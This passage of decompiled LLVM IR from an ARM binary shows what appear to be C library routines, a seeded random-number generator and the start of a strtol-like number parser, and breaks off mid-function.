  %v2_117c4 = load i32, i32* %v1_117c4, align 4
  store i32 %v2_117c4, i32* %r2.global-to-local, align 4
  %v2_117cc = mul i32 %v2_117c4, 1103515245
  %v1_117d4 = add i32 %v2_117cc, 12345
  %tmp6 = bitcast i32 %v1_117d4 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_117d8 = bitcast float %tmp7 to i32
  store i32 %v1_117d8, i32* %r3.global-to-local, align 4
  store i32 %v1_117d8, i32* %v1_117c4, align 4
  %v0_117e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_117e0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_117e0, i32* %v2_117e0, align 4
  br label %dec_label_pc_11828

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117a8
  %v2_117e8 = load i32, i32* %arg1, align 4
  store i32 %v2_117e8, i32* %r2.global-to-local, align 4
  %v1_117ec = add i32 %tmp, 4
  %v2_117ec = inttoptr i32 %v1_117ec to i32*
  %v3_117ec = load i32, i32* %v2_117ec, align 4
  store i32 %v3_117ec, i32* %r0.global-to-local, align 4
  %v1_117f0 = inttoptr i32 %v2_117e8 to i32*
  %v2_117f0 = load i32, i32* %v1_117f0, align 4
  store i32 %v2_117f0, i32* %r1.global-to-local, align 4
  %v1_117f4 = inttoptr i32 %v3_117ec to i32*
  %v2_117f4 = load i32, i32* %v1_117f4, align 4
  %v4_117f4 = add i32 %v3_117ec, 4
  store i32 %v4_117f4, i32* %r0.global-to-local, align 4
  %v2_117f8 = add i32 %v2_117f4, %v2_117f0
  store i32 %v2_117f8, i32* %r3.global-to-local, align 4
  store i32 %v2_117f8, i32* %v1_117f0, align 4
  %v3_117fc = load i32, i32* %r2.global-to-local, align 4
  %v4_117fc = add i32 %v3_117fc, 4
  store i32 %v4_117fc, i32* %r2.global-to-local, align 4
  %v0_11800 = load i32, i32* %ip.global-to-local, align 4
  %v1_11800 = add i32 %v0_11800, 16
  %v2_11800 = inttoptr i32 %v1_11800 to i32*
  %v3_11800 = load i32, i32* %v2_11800, align 4
  store i32 %v3_11800, i32* %r1.global-to-local, align 4
  %v0_11804 = load i32, i32* %r3.global-to-local, align 4
  %v3_11804 = udiv i32 %v0_11804, 2
  store i32 %v3_11804, i32* %r3.global-to-local, align 4
  %v3_11808 = icmp ult i32 %v4_117fc, %v3_11800
  %v1_1180c = load i32, i32* %r4.global-to-local, align 4
  %v2_1180c = inttoptr i32 %v1_1180c to i32*
  store i32 %v3_11804, i32* %v2_1180c, align 4
  br i1 %v3_11808, label %dec_label_pc_11818, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_117e8
  %v1_11810 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_11810, i32* %r2.global-to-local, align 4
  %v0_11820.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_11818:                               ; preds = %dec_label_pc_117e8
  %v0_11818 = load i32, i32* %r0.global-to-local, align 4
  %v1_11818 = load i32, i32* %r1.global-to-local, align 4
  %v3_11818 = icmp ult i32 %v0_11818, %v1_11818
  br i1 %v3_11818, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_11818
  %v1_1181c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_1181c, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_11818, %._crit_edge, %bb
  %v0_11820 = phi i32 [ %v0_11820.pre, %._crit_edge ], [ %v0_11818, %dec_label_pc_11818 ], [ %v1_1181c, %bb ]
  %v1_11820 = load i32, i32* %ip.global-to-local, align 4
  %v2_11820 = add i32 %v1_11820, 4
  %v3_11820 = inttoptr i32 %v2_11820 to i32*
  store i32 %v0_11820, i32* %v3_11820, align 4
  %v0_11824 = load i32, i32* %r2.global-to-local, align 4
  %v1_11824 = load i32, i32* %ip.global-to-local, align 4
  %v2_11824 = inttoptr i32 %v1_11824 to i32*
  store i32 %v0_11824, i32* %v2_11824, align 4
  br label %dec_label_pc_11828

dec_label_pc_11828:                               ; preds = %dec_label_pc_117c4, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1182c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1182c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_11804, { 1, 0 }
  uselistorder i32 %v1_117d8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_11828, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @function_11838(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11838:
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11838 = load i32, i32* @r4, align 4
  store i32 %v3_11838, i32* %stack_var_-36, align 4
  %v12_11838 = load i32, i32* @r7, align 4
  %v1_1183c = add i32 %tmp, 12
  %v2_1183c = inttoptr i32 %v1_1183c to i8*
  %v3_1183c = load i8, i8* %v2_1183c, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_1184c = load i8, i8* %v2_1183c, align 1
  %tmp24 = icmp ugt i8 %v3_1183c, 4
  br i1 %tmp24, label %.dec_label_pc_118f8_crit_edge, label %dec_label_pc_11858

.dec_label_pc_118f8_crit_edge:                    ; preds = %dec_label_pc_11838
  br label %dec_label_pc_118f8

dec_label_pc_11858:                               ; preds = %dec_label_pc_11838
  %v0_11858 = load i32, i32* @r0, align 4
  %v2_11858 = icmp eq i32 %v0_11858, 0
  %v1_1185c = add i32 %tmp, 8
  %v2_1185c = inttoptr i32 %v1_1185c to i32*
  %v3_1185c = load i32, i32* %v2_1185c, align 4
  store i32 %v3_1185c, i32* %r6.global-to-local, align 4
  br i1 %v2_11858, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_11858
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_11858, %bb
  %v0_11868 = phi i32 [ %v0_11858, %dec_label_pc_11858 ], [ 1, %bb ]
  %v2_11864 = icmp eq i8 %v3_1184c, 0
  %v2_11868 = inttoptr i32 %v3_1185c to i32*
  store i32 %v0_11868, i32* %v2_11868, align 4
  br i1 %v2_11864, label %dec_label_pc_118f4, label %dec_label_pc_11870

dec_label_pc_11870:                               ; preds = %bb21
  %v1_11870 = add i32 %tmp, 13
  %v2_11870 = inttoptr i32 %v1_11870 to i8*
  %v3_11870 = load i8, i8* %v2_11870, align 1
  %v4_11870 = sext i8 %v3_11870 to i32
  store i32 %v4_11870, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_1187c = load i32, i32* @r0, align 4
  store i32 %v0_1187c, i32* @r4, align 4
  %v0_11880 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11880, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_118b0

dec_label_pc_1188c:                               ; preds = %dec_label_pc_118b0
  %v2_1188c = call i32 @function_cd70(i32 %v0_118b4, i32 127773)
  %v0_11890 = load i32, i32* @r4, align 4
  store i32 %v0_11890, i32* @r0, align 4
  %v1_11894 = load i32, i32* %fp.global-to-local, align 4
  %v2_11894 = mul i32 %v1_11894, 127773
  store i32 %v2_11894, i32* @r4, align 4
  store i32 127773, i32* @r1, align 4
  %v0_1189c = call i32 @function_cc44()
  %v1_118a0 = load i32, i32* %sb.global-to-local, align 4
  %v2_118a0 = mul i32 %v1_118a0, %v0_1189c
  %v0_118a4 = load i32, i32* @r4, align 4
  %v2_118a4 = sub i32 %v0_118a4, %v2_118a0
  %v8_118a4 = icmp slt i32 %v2_118a4, 0
  br i1 %v8_118a4, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_1188c
  %v2_118a8 = add i32 %v2_118a4, 2147483647
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_1188c, %bb22
  %storemerge = phi i32 [ %v2_118a8, %bb22 ], [ %v2_118a4, %dec_label_pc_1188c ]
  %v0_118ac = phi i32 [ %v2_118a8, %bb22 ], [ %v2_118a4, %dec_label_pc_1188c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_118ac = load i32, i32* %r8.global-to-local, align 4
  %v2_118ac = add i32 %v1_118ac, 4
  %v3_118ac = inttoptr i32 %v2_118ac to i32*
  store i32 %v0_118ac, i32* %v3_118ac, align 4
  %v4_118ac = load i32, i32* %r8.global-to-local, align 4
  %v5_118ac = add i32 %v4_118ac, 4
  store i32 %v5_118ac, i32* %r8.global-to-local, align 4
  %v0_118b0.pre = load i32, i32* @r7, align 4
  %v1_118b0.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_118b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_118b0

dec_label_pc_118b0:                               ; preds = %dec_label_pc_11870, %bb23
  %v0_118b4 = phi i32 [ %v0_1187c, %dec_label_pc_11870 ], [ %v0_118b4.pre, %bb23 ]
  %v0_118c8 = phi i32 [ %v4_11870, %dec_label_pc_11870 ], [ %v1_118b0.pre, %bb23 ]
  %v0_118bc = phi i32 [ 1, %dec_label_pc_11870 ], [ %v0_118b0.pre, %bb23 ]
  %v1_118bc = add i32 %v0_118bc, 1
  store i32 %v1_118bc, i32* @r7, align 4
  %v5_118c0 = icmp slt i32 %v0_118bc, %v0_118c8
  br i1 %v5_118c0, label %dec_label_pc_1188c, label %dec_label_pc_118c4

dec_label_pc_118c4:                               ; preds = %dec_label_pc_118b0
  %v2_118c8 = mul i32 %v0_118c8, 10
  store i32 %v2_118c8, i32* @r4, align 4
  %v0_118cc = load i32, i32* %r5.global-to-local, align 4
  %v1_118cc = add i32 %v0_118cc, 14
  %v2_118cc = inttoptr i32 %v1_118cc to i8*
  %v3_118cc = load i8, i8* %v2_118cc, align 1
  %v4_118cc = sext i8 %v3_118cc to i32
  %v2_118d0 = ptrtoint i32* %stack_var_-44 to i32
  %v0_118d4 = load i32, i32* %r6.global-to-local, align 4
  %v4_118d4 = mul nsw i32 %v4_118cc, 4
  %v5_118d4 = add i32 %v0_118d4, %v4_118d4
  %v1_118d8 = inttoptr i32 %v0_118cc to i32*
  store i32 %v5_118d4, i32* %v1_118d8, align 4
  %v3_118d8 = add i32 %v0_118cc, 4
  %v4_118d8 = inttoptr i32 %v3_118d8 to i32*
  %v5_118d8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_118d8, i32* %v4_118d8, align 4
  br label %dec_label_pc_118e4

dec_label_pc_118e0:                               ; preds = %dec_label_pc_118e4
  %v0_118e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_118e0 = inttoptr i32 %v0_118e8 to i32*
  %v3_118e0 = call i32 @function_117a8(i32* %v2_118e0, i32 %v2_118d0)
  br label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %dec_label_pc_118c4, %dec_label_pc_118e0
  %v0_118e4 = load i32, i32* @r4, align 4
  %v1_118e4 = add i32 %v0_118e4, -1
  store i32 %v1_118e4, i32* @r4, align 4
  %v6_118e4 = icmp slt i32 %v1_118e4, 0
  br i1 %v6_118e4, label %dec_label_pc_118f4, label %dec_label_pc_118e0

dec_label_pc_118f4:                               ; preds = %dec_label_pc_118e4, %bb21
  %v2_118fc.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_118f8

dec_label_pc_118f8:                               ; preds = %.dec_label_pc_118f8_crit_edge, %dec_label_pc_118f4
  %v2_118fc = phi i32 [ %v3_11838, %.dec_label_pc_118f8_crit_edge ], [ %v2_118fc.pre, %dec_label_pc_118f4 ]
  %v1_11900 = phi i32 [ -1, %.dec_label_pc_118f8_crit_edge ], [ 0, %dec_label_pc_118f4 ]
  store i32 %v2_118fc, i32* @r4, align 4
  store i32 %v12_11838, i32* @r7, align 4
  ret i32 %v1_11900

; uselistorder directives
  uselistorder i32 %v1_118e4, { 1, 0 }
  uselistorder i32 %v0_118cc, { 1, 0, 2 }
  uselistorder i32 %v0_118bc, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 0, 1 }
  uselistorder i32 127773, { 2, 1, 0 }
  uselistorder label %dec_label_pc_118f8, { 1, 0 }
  uselistorder label %dec_label_pc_118e4, { 1, 0 }
  uselistorder label %dec_label_pc_118b0, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_11904(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11904:
  %v0_11904 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11904, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11904
  %v2_11904 = load i32, i32* @r7, align 4
  %v5_11904 = udiv i32 %v2_11904, 8
  %v6_11904 = and i32 %v5_11904, %arg1
  %v3_11908 = load i32, i32* @fp, align 4
  %v8_11908 = shl i32 %v6_11904, %v3_11908
  %v9_11908 = and i32 %v8_11908, %arg1
  %v2_1190c = load i32, i32* @sp, align 4
  %v8_1190c = shl i32 %v2_1190c, %arg3
  %v9_1190c = and i32 %v8_1190c, %arg2
  call void @__pseudo_branch(i32 %v9_1190c)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11904, %bb
  %v10_1190c = phi i32 [ %arg1, %dec_label_pc_11904 ], [ %v9_11908, %bb ]
  ret i32 %v10_1190c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_11910(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11910:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_11910 = load i32, i32* @r4, align 4
  %v6_11910 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_11940, label %dec_label_pc_11930

dec_label_pc_11930:                               ; preds = %dec_label_pc_11910
  %v2_11930 = icmp ugt i32 %arg2, 254
  %v7_11930 = icmp eq i32 %arg2, 255
  %v2_11934 = xor i1 %v7_11930, true
  %v3_11934 = and i1 %v2_11930, %v2_11934
  br i1 %v3_11934, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_11930
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_11930, %bb
  %v1_1196c7 = phi i32 [ %v3_11910, %dec_label_pc_11930 ], [ 4, %bb ]
  %v2_11938 = xor i1 %v2_11930, true
  %v3_11938 = or i1 %v7_11930, %v2_11938
  br i1 %v3_11938, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_11940:                               ; preds = %dec_label_pc_11910
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_11958, label %dec_label_pc_11948

dec_label_pc_11948:                               ; preds = %dec_label_pc_11940
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_119c8

.thread10:                                        ; preds = %dec_label_pc_11948
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_11958:                               ; preds = %dec_label_pc_11940
  %v2_11958 = icmp ugt i32 %arg2, 62
  %v7_11958 = icmp eq i32 %arg2, 63
  %v2_1195c = xor i1 %v7_11958, true
  %v3_1195c = and i1 %v2_11958, %v2_1195c
  br i1 %v3_1195c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_11958
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_11958, %bb23
  %v1_1196c6 = phi i32 [ %v3_11910, %dec_label_pc_11958 ], [ 2, %bb23 ]
  %v2_11960 = xor i1 %v2_11958, true
  %v3_11960 = or i1 %v7_11958, %v2_11960
  br i1 %v3_11960, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_11978 = phi i32 [ 3, %bb22 ], [ %v1_1196c7, %bb21 ], [ %v1_1196c6, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1a6c4.486 to i32), i32* %r3.global-to-local, align 4
  %v4_1196c = mul i32 %v1_11978, 4
  %v5_1196c = add i32 %v4_1196c, ptrtoint (i32* @global_var_1a6c4.486 to i32)
  store i32 %v5_1196c, i32* %r2.global-to-local, align 4
  %v1_11970 = add i32 %v4_1196c, add (i32 ptrtoint (i32* @global_var_1a6c4.486 to i32), i32 20)
  %v2_11970 = inttoptr i32 %v1_11970 to i32*
  %v3_11970 = load i32, i32* %v2_11970, align 4
  store i32 %v3_11970, i32* %r1.global-to-local, align 4
  %v1_11974 = add i32 %tmp, 4
  store i32 %v1_11974, i32* @r6, align 4
  %v6_11978 = inttoptr i32 %v5_1196c to i32*
  %v7_11978 = load i32, i32* %v6_11978, align 4
  store i32 %v7_11978, i32* %r2.global-to-local, align 4
  %v4_1197c = mul i32 %v3_11970, 4
  %v5_1197c = add i32 %v4_1197c, %v1_11974
  store i32 %v5_1197c, i32* %r3.global-to-local, align 4
  %v2_11980 = add i32 %arg3, 16
  %v3_11980 = inttoptr i32 %v2_11980 to i32*
  store i32 %v5_1197c, i32* %v3_11980, align 4
  %v0_11984 = load i32, i32* %r2.global-to-local, align 4
  %v1_11984 = trunc i32 %v0_11984 to i8
  %v2_11984 = load i32, i32* @r5, align 4
  %v3_11984 = add i32 %v2_11984, 14
  %v4_11984 = inttoptr i32 %v3_11984 to i8*
  store i8 %v1_11984, i8* %v4_11984, align 1
  %v0_11988 = load i32, i32* %r1.global-to-local, align 4
  %v1_11988 = trunc i32 %v0_11988 to i8
  %v2_11988 = load i32, i32* @r5, align 4
  %v3_11988 = add i32 %v2_11988, 13
  %v4_11988 = inttoptr i32 %v3_11988 to i8*
  store i8 %v1_11988, i8* %v4_11988, align 1
  %v0_1198c = load i32, i32* @r4, align 4
  %v1_1198c = trunc i32 %v0_1198c to i8
  %v2_1198c = load i32, i32* @r5, align 4
  %v3_1198c = add i32 %v2_1198c, 12
  %v4_1198c = inttoptr i32 %v3_1198c to i8*
  store i8 %v1_1198c, i8* %v4_1198c, align 1
  %v0_11990 = load i32, i32* @r6, align 4
  %v1_11990 = load i32, i32* @r5, align 4
  %v2_11990 = add i32 %v1_11990, 8
  %v3_11990 = inttoptr i32 %v2_11990 to i32*
  store i32 %v0_11990, i32* %v3_11990, align 4
  %v0_11994 = load i32, i32* @r5, align 4
  store i32 %v0_11994, i32* %r1.global-to-local, align 4
  %v0_11998 = load i32, i32* @r0, align 4
  %v2_11998 = inttoptr i32 %v0_11998 to i32*
  %v3_11998 = call i32 @function_11838(i32* %v2_11998, i32 %v0_11994)
  store i32 %v3_11998, i32* %r0.global-to-local, align 4
  %v0_1199c = load i32, i32* @r4, align 4
  %v2_1199c = icmp eq i32 %v0_1199c, 0
  br i1 %v2_1199c, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_119b812 = load i32, i32* @r7, align 4
  %v2_119b813 = inttoptr i32 %v1_119b812 to i32*
  store i32 0, i32* %v2_119b813, align 4
  %v1_119bc = load i32, i32* @r4, align 4
  store i32 %v1_119bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_119e0

.thread4:                                         ; preds = %bb26
  %v1_119a0 = load i32, i32* @r5, align 4
  %v2_119a0 = add i32 %v1_119a0, 4
  %v3_119a0 = inttoptr i32 %v2_119a0 to i32*
  %v4_119a0 = load i32, i32* %v3_119a0, align 4
  %v1_119a4 = load i32, i32* @r6, align 4
  %v3_119a4 = sub i32 %v4_119a0, %v1_119a4
  %v4_119a8 = sdiv i32 %v3_119a4, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_119b0 = mul i32 %v4_119a8, 5
  %v5_119b0 = add i32 %v4_119b0, %v0_1199c
  store i32 %v5_119b0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_119b8 = load i32, i32* @r7, align 4
  %v2_119b8 = inttoptr i32 %v1_119b8 to i32*
  store i32 0, i32* %v2_119b8, align 4
  %v1_119c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_119c0 = load i32, i32* @r7, align 4
  %v3_119c0 = inttoptr i32 %v2_119c0 to i32*
  store i32 %v1_119c0, i32* %v3_119c0, align 4
  %v1_119e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_119e0

dec_label_pc_119c8:                               ; preds = %dec_label_pc_11948
  %v0_119c8 = call i32 @function_d0ec()
  store i32 %v0_119c8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_119d0 = inttoptr i32 %v0_119c8 to i32*
  store i32 22, i32* %v2_119d0, align 4
  %v0_119d4 = call i32 @function_d0ec()
  %v0_119d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_119d8 = inttoptr i32 %v0_119d4 to i32*
  store i32 %v0_119d8, i32* %v2_119d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_119e0

dec_label_pc_119e0:                               ; preds = %bb27, %.thread4, %dec_label_pc_119c8
  %v1_119e8 = phi i32 [ %v1_119e8.pre, %.thread4 ], [ %v1_119bc, %bb27 ], [ -1, %dec_label_pc_119c8 ]
  store i32 %v3_11910, i32* @r4, align 4
  store i32 %v6_11910, i32* @r5, align 4
  ret i32 %v1_119e8

; uselistorder directives
  uselistorder i1 %v7_11958, { 1, 0 }
  uselistorder i1 %v7_11930, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1a6c4.486 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_119e0, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_119f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_119f4:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_11a04 = call i32 @function_11a14()
  ret i32 %v0_11a04
}

define i32 @function_11a14() local_unnamed_addr {
dec_label_pc_11a14:
  store i32 1, i32* @r3, align 4
  %v0_11a20 = call i32 @function_11a30()
  ret i32 %v0_11a20
}

define i32 @function_11a30() local_unnamed_addr {
dec_label_pc_11a30:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_11a30 = load i32, i32* @r4, align 4
  %v12_11a30 = load i32, i32* @r7, align 4
  store i32 920, i32* @lr, align 4
  %v0_11a44 = load i32, i32* @r1, align 4
  store i32 %v0_11a44, i32* %fp.global-to-local, align 4
  %v0_11a48 = load i32, i32* @r2, align 4
  store i32 %v0_11a48, i32* %r5.global-to-local, align 4
  %v0_11a4c = load i32, i32* @r0, align 4
  store i32 %v0_11a4c, i32* @r4, align 4
  %v0_11a50 = load i32, i32* @r3, align 4
  br label %dec_label_pc_11a5c

dec_label_pc_11a58:                               ; preds = %dec_label_pc_11a5c
  %v1_11a58 = add i32 %v0_11a94, 1
  store i32 %v1_11a58, i32* @r4, align 4
  br label %dec_label_pc_11a5c

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a30, %dec_label_pc_11a58
  %v0_11a94 = phi i32 [ %v0_11a4c, %dec_label_pc_11a30 ], [ %v1_11a58, %dec_label_pc_11a58 ]
  %v1_11a5c = inttoptr i32 %v0_11a94 to i8*
  %v2_11a5c = load i8, i8* %v1_11a5c, align 1
  %v3_11a5c = zext i8 %v2_11a5c to i32
  %v4_11a60 = load i32, i32* inttoptr (i32 143884 to i32*), align 4
  %v2_11a64 = mul nuw nsw i32 %v3_11a5c, 2
  %v2_11a68 = add i32 %v2_11a64, %v4_11a60
  %v3_11a68 = inttoptr i32 %v2_11a68 to i16*
  %v4_11a68 = load i16, i16* %v3_11a68, align 2
  %v1_11a6c = and i16 %v4_11a68, 32
  %v2_11a6c = icmp eq i16 %v1_11a6c, 0
  br i1 %v2_11a6c, label %dec_label_pc_11a74, label %dec_label_pc_11a58

dec_label_pc_11a74:                               ; preds = %dec_label_pc_11a5c
  %v7_11a74 = icmp eq i8 %v2_11a5c, 43
  br i1 %v7_11a74, label %dec_label_pc_11a94, label %dec_label_pc_11a7c

dec_label_pc_11a7c:                               ; preds = %dec_label_pc_11a74
  %v7_11a7c = icmp eq i8 %v2_11a5c, 45
  br i1 %v7_11a7c, label %dec_label_pc_11a94, label %bb

bb:                                               ; preds = %dec_label_pc_11a7c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_11a98

dec_label_pc_11a94:                               ; preds = %dec_label_pc_11a74, %dec_label_pc_11a7c
  %storemerge39 = phi i32 [ 1, %dec_label_pc_11a7c ], [ 0, %dec_label_pc_11a74 ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_11a94 = add i32 %v0_11a94, 1
  store i32 %v1_11a94, i32* @r4, align 4
  br label %dec_label_pc_11a98

dec_label_pc_11a98:                               ; preds = %bb, %dec_label_pc_11a94
  %v0_11ab8 = phi i32 [ %v0_11a94, %bb ], [ %v1_11a94, %dec_label_pc_11a94 ]
  %v1_11a98 = and i32 %v0_11a48, -17
  %v3_11a98 = icmp eq i32 %v1_11a98, 0
  br i1 %v3_11a98, label %dec_label_pc_11aa4, label %bb52

bb52:                                             ; preds = %dec_label_pc_11a98
  store i32 %v0_11a4c, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a98
  %v1_11aa4 = inttoptr i32 %v0_11ab8 to i8*
  %v2_11aa4 = load i8, i8* %v1_11aa4, align 1
  %v7_11aa8 = icmp eq i8 %v2_11aa4, 48
  %v1_11aac = add i32 %v0_11a48, 10
  store i32 %v1_11aac, i32* %r5.global-to-local, align 4
  br i1 %v7_11aa8, label %dec_label_pc_11ab8, label %bb53

bb53:                                             ; preds = %dec_label_pc_11aa4
  store i32 %v0_11a4c, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11aa4
  %v1_11ab8 = add i32 %v0_11ab8, 1
  %v2_11ab8 = inttoptr i32 %v1_11ab8 to i8*
  %v3_11ab8 = load i8, i8* %v2_11ab8, align 1
  %v4_11ab8 = zext i8 %v3_11ab8 to i32
  store i32 %v1_11ab8, i32* @r4, align 4
  %v1_11abc = or i32 %v4_11ab8, 32
  %v7_11ac0 = icmp eq i32 %v1_11abc, 120
  %v1_11ac4 = add i32 %v0_11a48, 8
  store i32 %v1_11ac4, i32* %r5.global-to-local, align 4
  store i32 %v1_11ab8, i32* %r6.global-to-local, align 4
  br i1 %v7_11ac0, label %bb54, label %.thread8

bb54:                                             ; preds = %dec_label_pc_11ab8
  %v3_11ad0 = mul i32 %v1_11ac4, 2
  store i32 %v3_11ad0, i32* %r5.global-to-local, align 4
  %v2_11ad4 = add i32 %v0_11ab8, 2
  store i32 %v2_11ad4, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_11ab8, %bb53, %bb54
  %v0_11ad8 = phi i32 [ %v1_11aac, %bb53 ], [ %v3_11ad0, %bb54 ], [ %v1_11ac4, %dec_label_pc_11ab8 ]
  %v5_11adc = icmp slt i32 %v0_11ad8, 16
  br i1 %v5_11adc, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_11af4 = phi i32 [ %v0_11a48, %bb52 ], [ %v0_11ad8, %.thread8 ], [ 16, %bb55 ]
  %v1_11ae0 = add i32 %v0_11af4, -2
  %tmp = icmp ugt i32 %v1_11ae0, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_11af0

.thread:                                          ; preds = %bb56
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_11b9c

dec_label_pc_11af0:                               ; preds = %bb56
  %v2_11af8 = call i32 @function_cc2c(i32 -1, i32 %v0_11af4)
  store i32 -1, i32* @r0, align 4
  %v0_11b04 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11b04, i32* @r1, align 4
